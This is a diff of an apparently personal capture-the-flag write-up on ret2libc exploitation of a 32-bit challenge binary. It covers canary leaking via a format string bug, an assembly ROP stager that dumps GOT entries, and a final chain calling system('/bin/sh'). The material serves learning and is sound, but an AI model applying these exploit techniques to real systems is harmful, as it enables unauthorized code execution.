@@ -9,7 +9,7 @@ categories: ctf binary-exploitation
 
 This challenge is pretty straightforward and provides a great introduction to the ret2libc method of exploitation.
 
-#### Gaining an understanding of the program
+# Gaining an understanding of the program
 
 The program begins by asking the user to guess a *random* number based on the remainder of the address of `rand` as seen in the code snippet below. When guessed correctly, the program asks for a name and proceeds by printing it to the screen.
 
@@ -58,7 +58,7 @@ To successfully exploit this binary, we need to leverage the format string vulne
 
 # Bruteforcing the random number {#brute-forcing}
 
-`(get_random() % 4096) + 1` gives the solutions a range from -4095 to +4097 a total range of over 8000 however we can narrow this down. Firstly, as the function address is coerced to a signed 32-bit integer we know that this integer will be negative as libc is usually based at a high address. Secondly, the addresses of the libc functions always seem to be 16 byte aligned meaning that they go up in increments of 16, massively reducing the range to 256 possible values.
+`(get_random() % 4096) + 1` gives the solutions a range from -4095 to +4097 a total range of 8192 solutions however we can narrow this down. Firstly, as the function address is coerced to a signed 32-bit integer we know that this integer will be negative as libc is usually based at a high address. Secondly, the addresses of the libc functions always seem to be 16 byte aligned meaning that they go up in increments of 16, massively reducing the range to 256 possible values.
 
 ```python
 solutions = range(1, -4095, -16)
@@ -77,13 +77,18 @@ gef➤  canary
 Congrats: 200 f7fa2600 804877d 1 fffffad1 fffffad1 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 f7dd0078 f2f70100 80489fc 8049fbc ffffd098 804888c 0 0 3e8 1 ffffd0b0 f7fa2000 0 f7d9b4ca ffffd31b ffffd174 f7fa2000 f7d9b4ca 1 ffffd174 ffffd17c ffffd0d0 f7fa2000 80487ff 1 ffffd174 f7fa2000 0 ffffd17c 0 eb338acc a7fbe6dc 0 0 0 ffffd17c 0
 ```
 
-# Leaking Libc through a ROP chain
+# Leaking libc through a ROP chain
 
-Armed with the ability to leak the stack canary, we can now focus on getting our shell. I tried to avoid having to leak libc, making a syscall with ROP but, there were not enough gadgets. Though, using `ROPgadget`, I found some helpful gadgets which allowed me to make a ROP chain to dump GOT functions and write to data, I'll be calling this the stager for brevity.
+Armed with the ability to leak the stack canary, we can now focus on getting our shell. I tried to avoid having to leak libc instead, making a syscall to `execve` with a ROP chain but there were not enough useful gadgets. Though using `ROPgadget`, I found some helpful gadgets which allowed me to make a ROP chain to dump GOT functions and write to data, I’ll be calling this the stager for brevity.
 
 ```as
+# Addresses obtained using IDA
+
 .equ DATA_OFFSET, 0x804A000
 .equ GOT_IO_GETS_OFFSET, 0x8049FCC
+.equ GOT_IO_PRINTF_OFFSET, 0x8049FC8
+.equ GOT_IO_FGETS_OFFSET, 0x8049FD0
+.equ GOT_GETEGID_OFFSET, 0x8049FD8
 
 .macro print fmt, addr
     .long 0x08048470    # _printf@plt
@@ -105,15 +110,18 @@ Armed with the ability to leak the stack canary, we can now focus on getting our
 _start:
     gets DATA_OFFSET
     print DATA_OFFSET, GOT_IO_GETS_OFFSET
+    print DATA_OFFSET, GOT_IO_PRINTF_OFFSET
+    print DATA_OFFSET, GOT_IO_FGETS_OFFSET
+    print DATA_OFFSET, GOT_GETEGID_OFFSET
     gets DATA_OFFSET
     .long 0x80487FF     # main (restart app)
 ```
 
-The stager works by waiting for input from stdin and writing it to a writable section in the binary. We are able to use a hard coded address as the binary is compiled without PIE. After input is recieved the stager uses the data written as the format string argument to printf and uses the offset to `gets` in the GOT as the argument. The stager waits for one last input to write to the writable section and then restarts the app by returning to `main`.
+The stager works by waiting for input from stdin and writing it to a writable section in the binary. We are able to use a hardcoded address as the binary is not a PIE. After input is received the stager uses the data written as the format string argument to `printf` and proceeds to use this format string to dump GOT entries. The stager waits for one last input to write to the writable section and then restarts the app by returning to `main`.
 
 #### Getting the stager running
 
-We now need overwrite EIP to an address we control. Using gef's `pattern create` command to create a string and passing it to the application we'll able to obtain the offset to EIP using the information gained I was able to make this python function.
+We now need to overwrite the return address to an address we control. Using gef's `pattern create` command to create a string and pass it to the application we'll be able to obtain the offset to the return address. Using the information gained I was able to make this python function.
 
 ```python
 def create_rop_chain(stack_cookie: int, stager: BinaryIO) -> bytes:
@@ -124,9 +132,24 @@ def create_rop_chain(stack_cookie: int, stager: BinaryIO) -> bytes:
     return exploit
 ```
 
-#### Leaking Libc
+#### Finding the libc version on the server
 
-Now that we are able to run our stager we'll pass it `%.4s` as the first argument for a 4 byte format string and then recieve the GOT entry for `gets`. The stager will send us a byte string containing the address which can be converted to something useable using `int.from_bytes` in python. Now that we have the address we can use a [libc database](https://libc.blukat.me/) to find the version of Libc running on the server so that we can get the offset of functions in that libc binary. 
+Now that we are able to run our stager we'll pass it `%.4s` as the first argument for the format string and then recieve the GOT entry for `gets`. The stager will send us a 4 byte string containing the address which can be converted to something useable using `int.from_bytes` in python. Now that we have the addresses we can use a [libc database](https://libc.blukat.me/) to find the libc version running on the server so that we can get the offsets of functions in that libc binary. Using this I found the libc version to be `libc6-i386_2.27-3ubuntu1.4_amd64.so`. Thankfully, the libc database search provides us with offsets to useful functions. For the final input to the stager we can send it `/bin/sh` to write to the data section for us to pass it to system and get a shell.
 
+![libc database search](/assets/images/libc_database_search.png)
+
+# Popping a shell
+
+Subtracting the GOT entry to `gets` from the offset of `gets` in the libc binary we can find the base address for libc. Using this we can contruct the final ROP chain and call system with the binary path being a pointer to the data section with the `/bin/sh` string we just wrote using the stager.
+
+```python
+exploit =  p32(libc + LIBC_SYSTEM_OFFSET)   # system
+exploit += p32(libc + LIBC_EXIT_OFFSET)     # exit when routine complete
+exploit += p32(DATA_OFFSET)                 # /bin/sh
+```
+
+# The exploit
+
+Here is the complete [source code](https://gist.github.com/aidnzz/5631bc65c38318fe74dd23e0390c9633). Using [pwntools](https://docs.pwntools.com/en/stable/) really simplifies exploit development and features some really good logging utilities.
 
 <script id="asciicast-dKo2JK5qNYfD9ln8n8zp4gKvy" src="https://asciinema.org/a/dKo2JK5qNYfD9ln8n8zp4gKvy.js" async data-size="small"></script>
